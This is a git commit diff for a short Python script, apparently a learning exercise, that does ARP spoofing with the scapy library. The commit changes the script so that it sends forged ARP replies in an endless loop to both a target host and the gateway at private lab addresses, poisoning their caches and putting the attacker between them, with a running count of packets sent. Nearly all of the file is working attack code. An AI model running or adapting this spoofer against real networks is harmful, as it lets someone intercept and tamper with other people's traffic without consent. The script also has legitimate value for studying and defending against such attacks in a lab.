83c7508732b309cf6e9d8f9dc716df1fa23676af
Julio Wandekoken <jwandekoken@gmail.com>
2021-12-30 05:05:39 -0500

    feat: added dynamic print

--- main.py
+++ main.py
@@ -1,4 +1,5 @@
 import scapy.all as scapy
+import time
 
 
 def get_mac(ip):
@@ -9,15 +10,19 @@ def get_mac(ip):
     # we want only the first element (since we are not asking for a ip range, but for a single ip)
     # and the data we want will be at the index 1 of the found element
     # the mac will be at the hwsrc key
-    return answered_list[0][1].hwsrc   
-  
+    return answered_list[0][1].hwsrc
+
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    
-    print(target_mac)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
-spoof("172.16.239.139", "172.16.239.2")
+sent_packets_count = 0
+while True:
+    spoof("172.16.239.139", "172.16.239.2")
+    spoof("172.16.239.2", "172.16.239.139")
+    sent_packets_count+=2
+    print("\r[+] Packets sent: {count}".format(count=sent_packets_count), end="")
+    time.sleep(2)
